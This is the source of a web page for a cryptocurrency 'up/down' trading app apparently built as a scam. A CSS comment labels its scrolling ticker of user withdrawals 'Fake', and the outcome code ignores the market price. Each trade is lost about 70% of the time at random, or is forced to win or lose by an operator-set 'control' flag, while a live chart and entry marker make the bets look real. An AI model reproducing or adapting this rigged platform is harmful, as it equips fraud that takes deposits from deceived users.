<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Trade Pro - Stable</title>
    <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-auth-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-database-compat.js"></script>
    <style>
        :root { --bg: #060708; --card: #131722; --yellow: #f0b90b; --green: #00c805; --red: #ff3b30; --text: #d1d4dc; }
        body { background: var(--bg); color: var(--text); font-family: sans-serif; margin: 0; padding: 0; overflow-x: hidden; }
        
        /* 1. Fake Withdrawal Ticker */
        .ticker-wrap { width: 100%; overflow: hidden; background: #1e222d; border-bottom: 1px solid #2a2e39; height: 30px; z-index: 1000; position: relative; }
        .ticker { display: inline-block; white-space: nowrap; animation: ticker 30s linear infinite; line-height: 30px; font-size: 11px; }
        @keyframes ticker { 0% { transform: translateX(100%); } 100% { transform: translateX(-100%); } }
        .ticker span { margin: 0 25px; color: var(--yellow); font-weight: bold; }

        .top-bar { display: flex; justify-content: space-between; padding: 12px; background: var(--card); border-bottom: 1px solid #2a2e39; }
        #chart-container { height: 350px; width: 100%; position: relative; background: #000; }
        
        /* Entry Marker Fix */
        #entry-marker { position: absolute; width: 100%; height: 2px; border-top: 1px dashed var(--yellow); display: none; z-index: 100; top: 50%; }
        #entry-label { position: absolute; right: 0; top: -20px; background: var(--yellow); color: black; padding: 2px 6px; font-size: 10px; font-weight: bold; border-radius: 2px; }

        .controls { background: var(--card); padding: 15px; border-radius: 20px 20px 0 0; margin-top: -10px; position: relative; border-top: 1px solid #2a2e39; }
        .input-box { background: #1e222d; border: 1px solid #363c4e; color: white; padding: 12px; border-radius: 8px; width: 100%; box-sizing: border-box; margin-bottom: 10px; font-size: 18px; text-align: center; }
        .btn-group { display: flex; gap: 10px; }
        .btn { flex: 1; padding: 16px; border: none; border-radius: 10px; color: white; font-weight: bold; font-size: 1.1rem; }
        .up { background: var(--green); } .down { background: var(--red); }

        .history { padding: 15px; background: var(--card); margin-top: 5px; }
        .hist-row { display: flex; justify-content: space-between; padding: 8px 0; border-bottom: 1px solid #2a2e39; font-size: 13px; }
    </style>
</head>
<body>

<div class="ticker-wrap">
    <div class="ticker">
        <span>● hussain*** withdrew $850.00</span> <span>● rahul*** deposited $2,000.00</span> <span>● ayaan*** withdrew $150.00</span> <span>● ali_fx deposited $500.00</span>
    </div>
</div>

<div class="top-bar">
    <div style="color:var(--yellow); font-weight:bold;">BTC/USDT</div>
    <div>Bal: <span id="top-bal" style="color:var(--yellow)">$0.00</span></div>
</div>

<div id="chart-container">
    <div id="entry-marker"><span id="entry-label">ENTRY @ 0.00</span></div>
    <iframe src="https://s.tradingview.com/widgetembed/?symbol=BINANCE:BTCUSDT&interval=1&theme=dark" style="width: 100%; height: 100%; border: none;"></iframe>
</div>

<div class="controls">
    <div id="status-text" style="text-align:center; color:var(--yellow); font-size:14px; margin-bottom:10px; font-weight:bold;">READY</div>
    <input type="number" id="trade-amt" class="input-box" value="10">
    <div class="btn-group">
        <button class="btn up" id="up-btn" onclick="startTrade('UP')">UP</button>
        <button class="btn down" id="down-btn" onclick="startTrade('DOWN')">DOWN</button>
    </div>
</div>

<div class="history">
    <div style="font-weight:bold; color:var(--yellow); margin-bottom:10px;">Recent Trades</div>
    <div id="history-list"></div>
</div>

<script>
    const firebaseConfig = { apiKey: "AIzaSyCM_qmcvOXXjJrQHPiracy5SOpTjAJEnYU", authDomain: "trade-for-profit-8b160.firebaseapp.com", databaseURL: "https://trade-for-profit-8b160-default-rtdb.firebaseio.com", projectId: "trade-for-profit-8b160", storageBucket: "trade-for-profit-8b160.firebasestorage.app", messagingSenderId: "1077014018991", appId: "1:1077014018991:web:c41320e2ef10291afd4d5a" };
    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();
    const auth = firebase.auth();

    let livePrice = 0;
    let isTrading = false;

    // 1. Get Live Price
    setInterval(() => {
        fetch('https://api.binance.com/api/v3/ticker/price?symbol=BTCUSDT')
        .then(r => r.json()).then(d => { livePrice = parseFloat(d.price); });
    }, 1000);

    // 2. Auth & Load Data
    auth.onAuthStateChanged(u => {
        if(u) {
            db.ref('users/'+u.uid).on('value', s => {
                const data = s.val();
                document.getElementById('top-bal').innerText = "$" + (data.balance || 0).toFixed(2);
                loadHistory(data.history);
                checkActiveTrade(u.uid, data.activeTrade);
            });
        }
    });

    function startTrade(dir) {
        if(isTrading) return;
        const u = auth.currentUser;
        const amt = parseFloat(document.getElementById('trade-amt').value);
        
        db.ref('users/'+u.uid).once('value', s => {
            const bal = s.val().balance || 0;
            if(amt > bal) return alert("Insufficient Balance");

            const tradeData = {
                dir: dir,
                amount: amt,
                entryPrice: livePrice,
                startTime: Date.now(),
                status: "running"
            };

            db.ref('users/'+u.uid).update({ 
                balance: bal - amt,
                activeTrade: tradeData 
            });
        });
    }

    function checkActiveTrade(uid, trade) {
        if(!trade || trade.status !== "running") {
            isTrading = false;
            document.getElementById('entry-marker').style.display = "none";
            document.getElementById('status-text').innerText = "READY";
            return;
        }

        isTrading = true;
        const timeLeft = 60 - Math.floor((Date.now() - trade.startTime) / 1000);
        
        if(timeLeft <= 0) {
            finishTrade(uid, trade);
        } else {
            document.getElementById('status-text').innerText = "CLOSING IN: " + timeLeft + "s";
            document.getElementById('entry-marker').style.display = "block";
            document.getElementById('entry-label').innerText = "ENTRY @ " + trade.entryPrice.toFixed(2);
            setTimeout(() => checkActiveTrade(uid, trade), 1000);
        }
    }

    function finishTrade(uid, trade) {
        db.ref('users/'+uid).once('value', s => {
            const control = s.val().control || "NORMAL";
            let win = (control === "WIN") ? true : (control === "LOSS" ? false : Math.random() > 0.7);
            const profit = win ? (trade.amount * 1.85) : 0;
            
            const newHistory = s.val().history || [];
            newHistory.unshift({
                type: trade.dir,
                amount: trade.amount,
                result: win ? "WIN" : "LOSS",
                time: new Date().toLocaleTimeString()
            });

            db.ref('users/'+uid).update({
                balance: (s.val().balance || 0) + profit,
                activeTrade: null,
                history: newHistory.slice(0, 10)
            });
            alert(win ? "Profit! +$" + (trade.amount * 0.85).toFixed(2) : "Loss! -$" + trade.amount);
        });
    }

    function loadHistory(hist) {
        const list = document.getElementById('history-list');
        list.innerHTML = "";
        if(!hist) return list.innerHTML = "No trades yet";
        hist.forEach(h => {
            list.innerHTML += `<div class="hist-row">
                <span>${h.type} | ${h.time}</span>
                <span style="color:${h.result === 'WIN' ? 'var(--green)' : 'var(--red)'}">${h.result} ($${h.amount})</span>
            </div>`;
        });
    }
</script>
</body>
</html>
